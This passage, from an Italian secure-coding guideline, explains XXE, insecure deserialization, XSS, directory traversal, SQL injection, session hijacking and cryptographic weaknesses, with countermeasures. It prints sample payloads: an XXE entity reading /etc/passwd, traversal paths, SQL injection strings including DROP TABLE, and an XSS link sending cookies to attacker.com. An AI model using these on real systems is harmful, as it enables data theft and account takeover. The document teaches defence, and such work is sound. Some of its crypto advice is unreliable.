situazioni, può portare alle estreme conseguenze l’ attacco, fino a compromettere il server sottostante  o 
altre infrastrutture di back-end, sfruttando la vul nerabilità XXE e falsificando delle richieste sul l ato server 
(SSRF). 
Alcune applicazioni utilizzano il formato XML per t rasmettere dati tra il browser e il server. Le appl icazioni 
che lo fanno praticamente utilizzano sempre una lib reria standard o un'API della piattaforma per elabo rare 
i dati XML sul server. Le vulnerabilità di XXE sorg ono perché la specifica XML contiene varie funziona lità 
potenzialmente pericolose e i parser standard suppo rtano queste funzionalità, anche se non vengono 
normalmente utilizzate dall'applicazione. 
Le entità esterne XML sono un tipo di entità XML pe rsonalizzata i cui valori definiti vengono caricati  
dall'esterno del DTD in cui sono dichiarati. Le ent ità esterne sono particolarmente interessanti dal p unto di 
vista della sicurezza perché consentono di definire  un'entità in base al contenuto di un percorso di f ile o 
URL. 
Le entità XML sono un modo per rappresentare un ele mento di dati all'interno di un documento XML, 
anziché utilizzare i dati stessi. Varie entità sono  integrate nelle specifiche del linguaggio XML. Per  esempio, 
le entità &lt; e &gt; rappresetano i metacaratteri ‘<’ e ‘>’. Poiché sono usati per indicare i tag XML , devono 
generalmente essere rappresentati usando le loro en tità quando compaiono all'interno dei dati. 
L’XML consente di indicare delle entità personalizz ate all’interno del loro DTD di riferimento, come 
nell’esempio seguente:  
 
<!DOCTYPE foo [ <!ENTITY entitaPersonalizzata "enti tà personalizzazta per usi 
interni" > ]> 
 
Questa definizione significa che qualsiasi utilizzo  dell'entità &entitaPersonalizzata; all'interno del  
documento XML verrà sostituito con il valore defini to: "entità personalizzazta per usi interni". 
Se un utente ha la possibilità di intodurre un’enti tà che si riferisca a una risorse esterna, il parse r XML 
riporterà all’interno dell’applicazione qualsiasi c ontenuto. Un malintenzionato può così introdurre e far 
eseguire codice malevolo. 
Ad esempio può essere referenziato un percorso URL,  che può puntare a un file del sistema operativo 
(tramite il protocollo file://) o esterno (tramite il protocollo http://). 
 
Esempio:  
Entità esterna che espone a vulnerabilità l’applica zione: 
 
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/t o/file" > ]> 
 
Se si indica il file  /etc/passwd , se ne ottiene l’automatica lettura e inclusione n el documento.  
 
Contromisure 
Tutte le vulnerabilità XXE sorgono perché la librer ia di parsing dell’XML utilizzata dall'applicazione  supporta 
funzionalità XML potenzialmente pericolose. Il modo  più semplice ed efficace per prevenire gli attacch i XXE 
è disabilitare tali funzionalità. 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 26  a 156  
 
In generale, è sufficiente disabilitare la risoluzi one automatica di entità esterne e disabilitare il supporto per 
XInclude, una parte della specifica XML che consent e di creare un documento XML a partire da 
sottodocumenti. Questo di solito può essere fatto t ramite opzioni di configurazione o sostituendo a li vello 
di programmazione il comportamento predefinito. Con sultare la documentazione per la libreria o l’API c he 
si occupa del parsng dell’XML per dettagli su come disabilitare le funzionalità pericolose e non neces sarie. 
6.1.4  Insecure Deserialization 
Quando dati organizzati in strutture come matrici, record, grafici, classi o altre configurazioni, dev ono 
essere archiviate o trasmesse in un'altra posizione , ad esempio attraverso una rete, devono passare 
attraverso un processo chiamato serializzazione. Qu esto processo converte e modifica l'organizzazione dei 
dati in un formato lineare, semplice da trasmettere  e da archiviare su dispositivi di storage. 
La deserializzazione, al contrario, converte il dat o lineare in dato strutturato, istanziando l’oggett o per l’uso 
da parte del processo di destinazione. 
I formati degli oggetti serializzati sono standardi zzati in modo da poter essere letti da piattaforme diverse, 
se necessario. Alcune delle piattaforme che support ano i processi di serializzazione includono python,  perl, 
php, ruby e Java. Anche la piattaforma Microsoft .N ET supporta le funzioni di serializzazione con  le classi 
XMLSerializer e DataContractSerializer, nonché le c lassi BinaryFormatter e NetDataContractSerializer, più 
potenti ma più vulnerabili. XML, YAML e JSON sono t ra i formati di dati serializzati più comunemente 
utilizzati. 
La vulnerabilità di deserializzazione non sicura si  presenta nel momento in cui un attaccante è in gra do di 
iniettare dati dannosi all’interno dei dati seriali zzati. Lo sfruttamento di tale attacco si compie qu ando dal 
dato serializzato il processo di destinazione crea un’istanza attiva. 
Contromisure 
Per mitigare il rischio di attacco attraverso una d eserializzazione non sicura è indispensabile ridurr e al 
minimo l'utilizzo della deserializzazione, riducend o i trasferimenti di dati non necessari tra applica zioni / 
sistemi, riducendo anche la quantità di file scritt i su disco. 
Occorre, inoltre, aderire al principio del privileg io minimo, minimizzando o disabilitando l'accesso a i 
privilegi amministrativi per ridurre l'impatto di u n possibile attacco andato a buon fine (defense in depth). 
 
6.1.5  Cross Site Scripting (XSS) 
Il Cross Site Scripting (XSS) è una problematica so litamente riscontrabile nelle applicazioni Web e co nsiste 
nella possibilità di inserire codice HTML o client- side scripting (comunemente Javascript) all’interno  di una 
pagina visualizzata da altri utenti. Un aggressore può, in questo modo, forzare l’esecuzione del codic e 
Javascript all’interno del browser utilizzato dal v isitatore.  
L’uso più comune del Cross Site Scripting è finaliz zato all’intercettazione dei cookie e/o dei token d i un 
utente regolarmente autenticato in un portale e qui ndi all’appropriazione indebita delle sessioni web da 
esso intraprese. Con le credenziali rubate, l’attac cante si spaccerà per l’utente legittimo (spoofing) .  
Esistono diverse forme di Cross Site Scripting, ma il funzionamento di base è sempre lo stesso. A vari are è 
invece la tecnica utilizzata per forzare l’esecuzio ne di codice Javascript nel browser del visitatore.  In alcuni 
casi un aggressore ha la possibilità di iniettare c odice persistente nella pagina web vulnerabile, ovv ero 
codice memorizzato dal server (ad esempio su un dat abase) e riproposto al client durante ogni singolo 
collegamento. In altre circostanze il codice iniett ato non viene memorizzato e la sua esecuzione è res a 
possibile solamente invogliando l’utente, attravers o tecniche di Social Engineering, a cliccare su un link che 
punta alla pagina web vulnerabile. In quest’ultimo caso L’URL viene solitamente rappresentato in forma to 
esadecimale (o altre forme) per evitare che l’utent e possa identificare il codice Javascript passato c ome 
parametro alla pagina stessa. In altri casi l’aggre ssore può beneficiare di tecniche di url spoofing p er 
mascherare il codice malevolo. Questa tecnica consi ste nel mascherare l’url fraudolento al fine di far lo 
sembrare del tutto simile all’url legittimo sul qua le ci si aspetta che l’utente clicchi. 
 
Le vulnerabilità di Cross Site Scripting (XSS) poss ono essere in particolare sfruttate da un aggressor e per: 
 
 
Linee guida per lo sviluppo sicuro Pag. 27  a 156  
 
• Prendere il controllo remoto di un browser; 
• Ottenere un cookie; 
• Modificare il collegamento ad una pagina; 
• Redirigere l’utente a un URI differente dall’origin ale; 
• Forzare l’immissione di dati importanti in form non -trusted (phishing); 
 
Esempio:  
Segue un esempio di servlet vulnerabile a Cross Sit e Scripting: 
 
Contromisure 
Al fine di evitare il Cross Site Scripting è di fon damentale importanza verificare l’input che provien e 
dall’esterno, prima di utilizzarlo all’interno dell a web application. 
Tale verifica comporta l’utilizzazione di funzioni di escaping, le quali rilevano caratteri ritenuti p ericolosi, ad 
esempio <, >, &, /, ’ ,” , sostituendoli con del te sto. 
Esistono a tal proposito molte librerie che consent ono di neutralizzare tag html, come anche pezzi di codice 
Javascript. 
6.1.6  Directory Traversal 
Le problematiche di Directory Traversal, note anche  come Dot-Dot Vulnerability, si verificano quando u n 
aggressore ha la possibilità di immettere dell’inpu t che verrà utilizzato dall’applicazione per accede re ad un 
file in lettura e/o scrittura. Solitamente le appli cazioni vietano l’utilizzo di percorsi completi (ad  esempio 
/etc/shadow o c:\winnt\system32\cmd.exe) ma in assenza di controlli sui dati acquisiti in 
ingresso, un aggressore può ugualmente raggiungere e acquisire il contenuto di un file residente all’e sterno 
dell’area a lui accessibile, anteponendo una sequen za di punti al nome dello stesso (ad esempio 
../../../../nomefile  oppure .../.../.../nomefile ). Poiché le problematiche di Directory 
Traversal sono state utilizzate dagli aggressori fi n dallo sviluppo dei primi Web Server, sono oggi tr a le più 
note. Non a caso molte applicazioni vengono progett ate in modo da mitigare il rischio del loro 
sfruttamento. Alcune fra queste tentano di corregge re i dati non validi acquisiti in input, trasforman doli in 
un flusso considerato valido. La casistica ha comun que dimostrato che è quasi sempre sconsigliato (al di 
fuori di specifiche eccezioni) affidarsi all’input utente per costruire nomi file e percorsi all’inter no 
dell’applicazione, in quanto vi è un’alta possibili tà di introdurre ulteriori fattori di instabilità o  insicurezza 
all’interno del software sviluppato. 
 
Esempio:  
Se nel codice sorgente viene utilizzato il nome del  file: 
BufferedReader reader = new BufferedReader(new File Reader(“data/”+ argv[1] )); 
String line = reader.readLine(); 
while(line!=null) { 
   System.out.println(line); 
   line = reader.readLine(); 
} 
 
 
Linee guida per lo sviluppo sicuro Pag. 28  a 156  
 
Il codice sorgente può essere manomesso, per ottene re l’accesso a un file sensibile, sostituendo il no me del 
file con il percorso al file ‘sensibilè al quale si  vuole accedere: 
../../../../etc/password 
Contromisure 
In una web application si dovrebbe evitare di utili zzare percorsi di file system inseriti dall'utente.  Se l'utente 
dovesse scegliere un file, occorrerebbe limitare la  selezione imponendogli una scelta limitata di file  
ammessi (white list), attraverso un indice numerico . Nel caso in cui fosse necessario utilizzare un pe rcorso 
fornito dall'utente, occorrerebbe verificarlo e/o s ottoporlo a escaping. 
Un'altra contromisura, valida soprattutto sui siste mi Unix/Linux, potrebbe essere quella di creare una  
chroot jail, ossia non permettere di sfuggire alla root accessibile dalla web application, in maniera tale da 
salvaguardare le directory critiche del sistema ope rativo. Lo stesso risultato potrebbe essere raggiun to 
consentendo l’accesso a un utente che ha accesso li mitato, la cui home directory coincida con la docum ent 
root. 
6.1.7  SQL Injection 
SQL Injection è una problematica che colpisce princ ipalmente le applicazioni Web che s’interfacciano a  un 
layer di back-end che utilizza un database relazion ale, anche se non unicamente circoscrivibile a 
quest’ambito. La SQL Injection è, infatti, una vuln erabilità che affligge tutte le applicazioni (anche  
client/server) che interrogano un DB. Si verifica q uando uno script o un’altra componente applicativa non 
filtra opportunamente l’input passato dall’utente, rendendo possibile per un aggressore l’alterazione della 
struttura originaria della query SQL, attraverso l’ utilizzo di caratteri speciali (ad esempio apici e virgolette) o 
mediante la concatenazione di costrutti multipli (a d esempio utilizzando la keyword SQL UNION). A seco nda 
delle circostanze e del tipo di database server con  cui l’applicazione si interfaccia, l’aggressore pu ò sfruttare 
una problematica di SQL Injection per: 
• Bypassare i meccanismi di autenticazione di un port ale (ad esempio forzando il ritorno di condizioni 
veritiere alle procedure di controllo); 
• Ricostruire il contenuto di un Database (ad esempio  localizzando le tabelle contenenti i token delle 
sessioni attive, visualizzando le password degli ut enti cifrate/non cifrate o altre informazioni di 
natura critica); 
• Aggiungere, alterare o rimuovere i dati già present i nel Database; 
• Eseguire stored-procedures. 
 
Si riportano di seguito tre problematiche di SQL In jection che rappresentano le tecniche di base da cu i 
derivano tutti i casi possibili: 
• Iniezione di una seconda query mediante il caratter e “;” 
Esempio: 
Si consideri la query: $sql = "SELECT * from utenti  WHERE id=$id"; 
Se il parametro $id  fosse acquisito da input utente e inizializzato al la stringa: 1; DROP table utenti  
La query risultante sarebbe: SELECT * from utenti WHERE id=1; DROP table utenti  che causerebbe la 
rimozione da parte dell’aggressore della tabella ut enti. Le query multiple non sono comunque 
supportate da tutti I database server. 
• Modifica della query attraverso introduzione del co mmento ‘--‘ 
Esempio: 
Si consideri la query: $sql = "SELECT * from utenti  WHERE login='$login' AND 
password='$password'"; 
Se il parametro $login fosse acquisito da input utente ed inizializzato al la stringa: xyz' OR 1=1 –-  
La query risultante sarebbe: SELECT * from utenti WHERE login='xyz' OR 1=1 --' A ND password=''  ed il 
database tratterebbe la parte successiva a “--“ com e commento, ignorandola e permettendo quindi 
all’aggressore di accedere senza specificare alcuna  password. 
• Iniezione di caratteri jolly ed eliminazione di par te della query: 
 
 
Linee guida per lo sviluppo sicuro Pag. 29  a 156  
 
• Esempio: 
Si consideri la query: $sql = "SELECT * FROM fattur e WHERE nome_cliente LIKE '%".$nome."%' AND 
ref_cliente=2 ORDER BY num_fattura ASC" 
Se il parametro $nome fosse acquisito da input utente e inizializzato all a stringa: %' #  
La query risultante sarebbe: SELECT * FROM fatture WHERE nome_cliente LIKE '%%' # AND 
ref_cliente=2 ORDER. 
 
Esempio di Script vulnerabile a SQL Injection: 
 
Contromisure 
Per impedire un attacco di SQL Injection è necessar io evitare di concatenare le stringhe delle query e  
affidarsi alle stored procedures e alle query param etriche (prepared statement). Può essere utile util izzare 
una libreria ORM come EntityFramework, Hibernate, o r iBatis, ma questa tecnologia – di per sé - non me tte 
al riparo dalla SQL Injection. 
6.2  Session Management 
Le problematiche di Session Management sono partico larmente comuni nelle applicazioni Web e più in 
generale in tutte quelle applicazioni che gestiscon o sessioni di collegamento inidividuali di ciascun client. 
Errori di progettazione del software in questo caso  possono consentire a utenti non autorizzati di acc edere 
a dati protetti. Un aggressore può appropriarsi del la sessione di collegamento di un utente lecito ope rando 
al suo posto, impedendo a quest’ultimo di accedere a una o più risorse.  
 
La prevenzione di tali attacchi può essere messa in  atto in diversi modi, ad esempio rigenereando l’id  di 
sessione a ogni login. La stessa cosa può essere fa tta con i cookies, rigenerandoli a ogni chiamata. È  
possibile utilizzare un id di sessione molto lungo,  in modo che non possa essere facilemente indovinat o. 
Nessuna di queste misure, tuttavia, riesce a elimin are del tutto il rischio di furto di sessione. L'un ico rimedio 
veramente efficace è utilizzare una connessione sic ura con SSL/TLS. 
 
Di seguito sono descritte le principali cause e vul nerabilità che danno origine a problematiche di Ses sion 
Management. 
6.2.1  Session Stealing e Hjihacking 
Un aggressore che riesce ad ottenere l’identificati vo di una sessione (detto anche token) o il cookie di un 
utente e replicarlo esattamente in una o più richie ste inviate al server, ha la capacità di accedere a d aree o 
risorse che dovrebbero solo essere riservate all’ut enza lecita, bypassando in modo diretto i meccanism i di 
autenticazione dell’applicazione.  
Sono diverse le cause che agevolano o permettono di  portare a termine attività di Session Stealing/Ses sion 
Hjhacking, di seguito vengono proposte le più comun i. 
 
Esempio:  
 
 
Linee guida per lo sviluppo sicuro Pag. 30  a 156  
 
Tramite la tecnica del DNS poisoning, l’attaccante può inserire record falsati nella cache del DNS Ser ver di 
cui si serve l’applicazione. Un file utilizzato dal l’applicazione viene risolto puntando a un file for nito 
dall’attaccante. L’url http://www.example.com/img_4 _cookie.jpg viene risolto dirigendo la richiesta ve rso il 
file con lo stesso nome fornito dalla macchina dell ’attaccante. Il sito sotto attacco, a quel punto, i nvierà 
proprio all’attaccante il suo cookie. Dal cookie il  malintenzionato potrà leggere l’id di sessione e u tilizzarlo 
per un’operazione di spoofing. 
Contromisure 
Per prevenire il DNS poisoning, il responsabile del  Domain Name Server può adottare misure di protezio ne 
che vanno sotto il nome di Domain Name System Security Extensions (DNSSEC) . 
 
6.2.1.1  Cookie 
L’attacco attraverso il quale un aggressore riesce solitamente ad appropriarsi in modo indebito del co okie 
di un altro utente è il già menzionato Cross Site S cripting. Altri fattori in fase di sviluppo dell’ap plicazione 
influenzano comunque la possibilità di portare a te rmine con successo un’attività di Session Stealing.  Questi 
sono in particolare: 
• La generazione di cookie il cui tempo di scadenza n on è chiaramente indicato; 
• La generazione di cookie persistenti sul client anc he dopo il termine della sessione; 
• La generazione di cookie non cifrati e trasmessi tr amite richieste in chiaro (clear-text); 
• La validità del cookie anche dopo un periodo di ina ttività dell’utente molto lungo; 
• L’assenza dell’attributo HttpOnly in fase di genera zione del cookie che ne agevola l’accesso a script 
client-side; 
• L’utilizzo di valori ricorrenti (prevedibili) invec e che randomici, nella composizione del cookie, 
durante la sua generazione. 
 
Esempio:  
Èpossibile entrare in possesso di un cookie di sess ione, tramite un attacco di Cross Site Scripting, a d 
esempio iniettando il seguente codice: 
 
<a href="#" onclick="window.location = 'http://atta cker.com/stole.cgi?text=' + 
escape(document.cookie); return false;">Click here! </a> 
 
L’id di sessione, in quanto autenticato, può essere  utilizzato per effettuare richieste considerate va lide 
verso il server. Le modalità attraverso le quali è possibile sfruttare gli attributi del cookie rubato  per 
assegnarli alla propria sessione, dipendono dal bro wser. Alcune estensioni, come ad esempio 
“EditThisCookie” su Chrome, permettono di modificar e agevolmente il cookie che si sta utilizzando. 
 
Contromisure 
Per garantire la sicurezza, sarebbe opportuno evita re di utilizzare i cookie, ma questo non è facilmen te 
realizzabile poiché, nel corso del tempo, i cookie sono diventati sempre più indispensabili nella 
memorizzazione dei dati. Per impedire il furto dei cookie è quindi necessario, farli viaggiare attrave rso 
connessioni https crittografate. Un’ulteriore prote zione può essere garantita impostando l’attributo 
HttpOnly a true, che impone che l’accesso al cookie  solo attraverso il protocollo http, e non tramite uno 
script client. La policy “Same Origin” garantisce c he il cookie venga trasmesso solo nelle chiamate 
all’interno dello stesso dominio, impedendo che pos sa essere condiviso con chiamate che provengano da 
altri domini. Questa policy è oggi adottata in mani era predefinita da tutti i maggiori browser. 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 31  a 156  
 
6.2.1.2  Token di sessione 
Un token è un identificativo che correla univocamen te una sessione a un utente. Tale valore, una volta  
generato, viene collocato all’interno del cookie o propagato attraverso l’URL affinché l’applicazione 
riconosca con esattezza l’utenza e determini, in ba se ai suoi privilegi, le azioni che può svolgere su l portale. 
Un aggressore può appropriarsi di un token di sessi one in almeno tre modi: 
• Creandolo sul momento (ad esempio quando il meccani smo di generazione del token è banale, non 
si basa su valori randomici ed è facilmente ricostr uibile a partire dal nome dell’utente). 
• Forzando l’utente a rivelarlo con un copia e incoll a dell’URL, se propagato con questa modalità. 
Spesso vengono utilizzate tecniche di Social Engine ering, allo scopo. 
• Indovinandolo attraverso tecniche di Brute Forcing.  Ciò è possibile quando l’identificativo della 
sessione viene generato con valori non randomici o utilizzando una bassa entropia. 
 
Esempio:  
Un token, come quello che segue, può essere facilme nte intercettato e analizzato: 
 
"result":[ 
{ 
"_id":"B663D248CE4C3B63A7422000B03B8F5E0F8E443B", 
"_rev":"", 
"token_id":"B663D248CE4C3B63A7422000B03B8F5E0F8E443 B", 
"sts_id":"username-transformer", 
"principal_name":"demo", 
"token_type":"OPENIDCONNECT", 
"expiration_time":1459376096 
}] 
Contromisure 
Una buona soluzione è di utilizzare la tecnologia J WT (JSON Web Token), per cui le informazioni vengon o 
firmate in maniera digitale. Il token non viene mem orizzato né nella sessione, né nel database, né alt rove.  
Un’altra tecnica si avvale del meccanismo conosciut o con l’acronimo OTP (One Time Password): il token è 
valido se attivato da una password temporanea, rila sciata in tempo reale, in concomitanza con l’operaz ione 
che s’intende effettuare. 
 
6.2.1.3  Accesso ad aree non autorizzate 
Un aggressore può in talune circostanze disinteress arsi dei cookie o dei token quando è in grado di ap rire 
una nuova sessione con i privilegi dell’utente desi derato nei modi seguenti: 
• bypassando il normale meccanismo di autenticazione dell’applicazione: l’aggressore può sfruttare 
problematiche di Directory Listing o Directory Trav ersal per accedere ad aree dell’applicazione che 
dovrebbero essere visibili solo previa autenticazio ne; 
• facendo leva su alcuni errori logici dell’applicazi one per ottenere la password corrente o 
sollecitarne un cambio. Questo caso si manifesta so litamente quando: 
• la procedura di reset della password dell’applicazi one fallisce nell’inviare la password al corretto 
utente o permette all’aggressore di cambiare improp riamente la casella e-mail alla quale la stessa 
viene trasmessa; 
• la password è facilmente determinabile a partire da lla risposta che può essere fornita alla domanda 
posta per ricordarla (nel caso in cui sia questo il  meccanismo di recupero adottato); 
• le password di accesso possono essere recuperate in  forma cifrata o in chiaro dal filesystem o dal 
database sfruttando problematiche di Directory List ing, Directory Traversal, SQL Injection, etc; 
• con un attacco di brute forcing per ottenere la pas sword direttamente dalla form di autenticazione 
dell’applicazione: l’aggressore può, di proposito o  involontariamente, determinare il blocco 
dell’account utente a causa dei meccanismi di lock- out che potrebbero scattare quando 
l’applicazione rileva un certo numero di tentativi di login falliti. Questo genere di interventi è 
classificabile nella categoria degli attacchi DoS. 
 
 
Linee guida per lo sviluppo sicuro Pag. 32  a 156  
 
 
Esempio:  
In alcuni casi è possibile modificare l’url di un’a pplicazione web per accedere direttamente alle diec tory del 
server nel quale è deployata (directory listing). O ccorre disabilitare, a livello di application serve r, l’opzione 
di browsing delle directory. 
 
 
In altri casi vengono sfruttate vulnerabilità conne sse con le directory accessibili dall’esterno (path  
traversal): www.example.com/lmapp/../../../etc/hosts  
 
In altri casi ancora le regole per il cambio passwo rd non sono sicure: ad esempio non viene richiesto 
l’inserimento della vecchia password o vengono post e domande di sicurezza le cui risposte sono intuiti ve o 
ricavabili attraverso il social engeenering. 
 
Contromisure 
È necessario: 
• verificare i dati in input (filtrando i caratteri “ ..” e “/”) per evitare i problemi del path traversa l e 
disabilitare nell’application server il directory l isting.  
• garantire la robustezza delle password, seguendo re gole precise sulla lunghezza, sulla complessità e 
sulla durata. Le password devono essere lunghe alme no otto caratteri e contenere lettere 
minuscole e maiuscole, numeri e simboli non alfanum erici; devono scadere a intervalli regolari, non 
devono essere inutitive, né devono essere simili al le ultime dodici inserite. 
 
6.3  Crittografia 
La crittografia rappresenta oggi uno degli strument i più proficui per sviluppare applicazioni software  sicure, 
capaci di rispondere alle necessità crescenti di pr eservazione dell’integrità e della riservatezza dei  dati, sia 
in transito sia a riposo. Di seguito vengono riport are le tecniche più comunemente utilizzate dagli 
aggressori per appropriarsi in modo fraudolento d’i nformazioni private, invertendo il loro processo di  
cifratura e le vulnerabilità più comuni che permett ono il verificarsi di tali condizioni. 
Di seguito sono descritte le principali cause e vul nerabilità inerenti problematiche di crittografia. 
 
6.3.1  Sniffing e algoritmi crittografici deboli 
Uno dei principali motivi addotti a favore dell’uso  della crittografia è quello di preservare la riser vatezza dei 
dati che vengono scambiati in rete. Le applicazioni  che non implementano alcun meccanismo crittografic o 
sono le più esposte a tecniche di sniffing, il proc esso di monitoraggio e acquisizione di tutti i pacc hetti di 
dati che attraversano una determinata rete. L’aggre ssore che riesce ad attestarsi in un punto qualsias i fra i 

 
 
Linee guida per lo sviluppo sicuro Pag. 33  a 156  
 
due nodi che comunicano (ad esempio nel gateway d’u scita del server) o che riesce a forzare il redirec t del 
traffico verso la sua postazione, può in pratica ri costruire con estrema semplicità il contenuto delle  sessioni 
applicative, intercettando e ricostruendo il flusso  dei dati in chiaro. Nessuna procedura di decryptin g è 
necessaria per appropriarsi delle informazioni tras messe. Questo tipo di attacco è anche noto come “Ma n 
In The Middle” (MITM). 
Cifrare i dati, tuttavia, potrebbe non essere suffi ciente a impedire lo sniffing. Anche in presenza di  sessioni 
cifrate, infatti, un aggressore può intercettare ed  archiviare tutto il traffico per cercare di decifr arlo in 
modalità offline, ovvero a sessione client/server t erminata. Il tipo di algoritmo che l’applicazione 
implementa e la dimensione della chiave di cifratur a utilizzata giocano un ruolo fondamentale nel gara ntire 
un’adeguata protezione da questo tipo di attacchi. Se l’applicazione implementa un algoritmo semplice e/o 
fa uso di una chiave crittografica di dimensioni no n adeguate, un aggressore può riuscire a decifrare i dati 
scambiati, persino in tempo reale. Le principali te cniche utilizzate per violare una chiave crittograf ica 
generata attraverso algoritmi simmetrici o di hashi ng vengono descritte nei paragrafi Brute Forcing e 
Rainbow Table. 
 
Nella crittografia simmetrica, un messaggio viene c ifrato dal mittente con una chiave e decifrato dal 
destinatario con la stessa chiave attraverso questi  semplici passaggi: 
il messaggio viene criptato dal mittente:  
       messaggio_cifrato = funzioneCrittografica(me ssaggio_in_chiaro, 
chiave_condivisa); 
e poi decriptato dal destinatario:  
      messaggio_in_chiaro = funzioneCrittografica(m essaggio_cifrato, 
chiave_condivisa); 
La crittografia simmetrica è un esempio di cifratur a debole, poiché la chiave può essere divulgata, 
intenzionalmente o per errore, con molta facilità. 
Contromisure 
La soluzione è la crittografia asimmetrica, a chiav e pubblica/privata, come nelle connessioni SSL/TLS (https). 
6.3.2  Brute forcing 
Il brute forcing è la tecnica principalmente utiliz zata da un aggressore per “rompere” la chiave critt ografica 
di un messaggio testuale o di una sequenza di byte cifrata (ad esempio una password).  
Un attacco di brute forcing può, tra l'altro, pales arsi tramite ripetuti tentativi di accesso ad un se rvizio, 
utilizzando una lista di username o password predef initi. Vengono tentate in modo sistematico tutte le  
possibili combinazioni di un valore crittografato. 
Un eventuale match identifica la chiave che può ess ere impiegata per riportare l’intero messaggio o la  
sequenza di byte in chiaro (clear-text). Il brute f orcing è una tecnica che a seconda dell’algoritmo 
crittografico utilizzato per cifrare un messaggio, e soprattutto della dimensione della chiave, può no n 
raggiungere l’intento di un aggressore in tempi rag ionevoli. Viene solitamente sfruttata per decifrare  
password o chiavi cifrate con algoritmi simmetrici.  
 
L’attacco di brute force può essere facilitato nei seguenti casi: 
• Weak Keys (chiavi deboli): il meccanismo di generaz ione automatico delle chiavi crittografiche di 
un’applicazione produce delle Weak Keys. Si tratta di chiavi che, quando utilizzate per cifrare un 
messaggio, generano in output lo stesso messaggio i n chiaro. Questa problematica è strettamente 
correlata al tipo di algoritmo crittografico utiliz zato e può essere occasionalmente riscontrata 
durante la generazione di chiavi DES, 3DES, RC4, Bl owfish, IDEA, etc. 
• Collisioni:  si tratta di una particolarità che si verifica nel caso degli algoritmi di hashing one-wa y 
(MD5, SHA-1, ecc…). Quando un’applicazione utilizza  questo genere di algoritmi, ad esempio per 
confrontare la password fornita da un utente con il  valore hash presente in un database, il valore in 
chiaro proveniente da input viene convertito in has h (una stringa cifrata). L’hash viene poi 
confrontato direttamente con il valore, sempre cifr ato, mantenuto nel database. Per alcuni 
 
 
Linee guida per lo sviluppo sicuro Pag. 34  a 156  
 
algoritmi (come MD5) è matematicamente dimostrata l a possibilità che la cifratura di valori testuali 
diversi può produrre in output lo stesso hash. Ques ta condizione, definita appunto collisione, può 
essere utilizzata da un aggressore per autenticarsi  in un portale, fornendo delle credenziali di 
accesso differenti dalle originali. 
 
L’attacco di brute forcing consiste nell’uso di un tool che elabora ad alta velocità combinazioni 
alfanumeriche col fine di intercettare chiavi critt ografiche e/o password. Alcuni esempi di tool facil mente 
reperibili per un’oprazione di brute force attack s ono: Aircrack-ng, John the Ripper, Rainbow Crack, C ain 
and Abel, L0phtCrack, Ophcrack, ecc. 
Contromisure 
Il brute force attack può essere contrastato blocca ndo l’account preso di mira, dopo un certo numero d i 
tentativi di login falliti. Tuttavia, se l’utente m alevolo ha organizzato l’attacco su un’utenza, ques ta 
potrebbe essere bloccata nuovameente, anche subito dopo lo sblocco da parte dell’help desk, 
determinandone la disabilitazione di fatto; se l’at tacco riguarda più utenze ne può derivare un blocco  del 
sistema (denial of service).  
Bloccare l’ip dell’aggressore potrebbe portare a es cludere una larga fascia di utenti leciti, in quant o l’ip 
potrebbe essere quello di un proxy. È preferibile b loccare un ip legandolo a un singolo device e a un singolo 
browser, attraverso l’uso di un device cookie. 
Una misura sorprendentemente efficace è quella di u tilizzare risposte imprevedibili agli attacchi brut e 
force. Ad esempio la web application potrebbe dare codice http 200 (success) e poi reindirizzare la ri sposta 
su una pagina in cui si spiega che è in corso un br ute force attack. Si può reindirizzare randomicamen te 
l’utente su una pagina e fargli ridigitare la passw ord. 
Ogni comportamento “creativo” dell’applicazione può  disinnescare gli automatismi che gli attaccanti ha nno 
messo in opera. 
6.3.3  Rainbow table e salt value 
Una rainbow table è concettualmente una tabella in cui sono mantenuti un numero cospicuo di hash per i  
quali è già conosciuto il valore originario (testo in chiaro). Si possono comprare in rete svariati te rabyte di 
tabelle rainbow, in base alla lunghezza delle strin ghe trattate. Un aggressore può quindi determinare in 
pochi secondi l’esatta corrispondenza (clear text) semplicemente inserendo un hash nel software che 
gestisce le rainbow table. Questa problematica si v erifica principalmente quando l’applicazione non ut ilizza 
un salt value per generare un hash. Un salt value è  un fattore randomico che modifica la conformazione  in 
output dell’hash stesso e non permette di utilizzar e le classiche Rainbow Table per la relativa conver sione 
in testo in chiaro. 
 
Esempio: nel codice che segue, una chiave ( uncrpyptedPassword ) viene concatenata ad una stringa 
arbitraria ( salt ), per evitare che venga rivelata attraverso le rainbow tables : 
 
messageDigest = MessageDigest.getInstance("SHA");  
messageDigest.update((unecryptedPassword+salt).getB ytes());  
 
Contromisure 
Utilizzare un valore della stringa salt  sufficientemente lungo e complesso, in modo che le  tabelle rainbow 
diventano completamente inutili ai fini della conve rsione clear text. 
6.3.4  Archiviazione insicura 
La trasmissione attraverso la rete di dati in chiar o testo o cifrati con algoritmi crittografici debol i non è 
l’unica pratica che può portare alla loro appropria zione indebita da parte di un aggressore. Anche arc hiviarli 
allo stesso modo nel filesystem o in un database pu ò portare alle stesse conseguenze.  
 
 
Linee guida per lo sviluppo sicuro Pag. 35  a 156  
 
Attraverso lo sfruttamento di altre vulnerabilità, quali la SQL injection, il buffer overflow, il dire ctory listing 
e altre, un aggressore può introdursi nel sistema e  carpire queste informazioni. 
Non direttamente correlabile con problematiche crit tografiche in senso stretto, la tecnica di File sys tem 
Polling viene spesso utilizzata da un aggressore co n accesso locale ad un sistema per appropriarsi dei  dati 
fintanto che essi permangono memorizzati su disco i n forma non cifrata. Questa condizione si verifica 
quando tali dati vengono temporaneamente salvati pe r lunghi periodi in tabelle di staging o in punti b en 
precisi del filesystem, prima di essere definitivam ente cifrati. L’aggressore, utilizzando script auto matici, 
può copiare ciclicamente il contenuto di queste tab elle e directory in locazioni del disco differenti e 
mantenere i relativi dati in forma intelligibile pe r i suoi scopi. 
Esempio:  
È banale accedere a un file non cifrato, contenente  dati elaborati, collocato in una directory raggiun gibile 
del file system.  
L’esecuzione del comando more /usr/app/data/accounts.txt  rivela i dettagli degli account che non 
dovrebbero essere divulgati.  
Contromisure 
Occorre applicare le misure di sicurezza citate in precedenza per impedire le problematiche che 
permettono agli attaccanti di raggiungere il file s ystem. I file e i dati sensibili o cruciali devono essere salvati 
nel filesystem in collocazioni dotate permessi rest rittivi, solo dopo averli correttamente criptati co n un 
algoritmo di crittografia “forte”. 
6.4  Gestione degli errori, delle eccezioni  
La gestione degli errori, delle eccezioni o delle c ircostanze fuori dalla norma sono tutti quanti aspe tti 
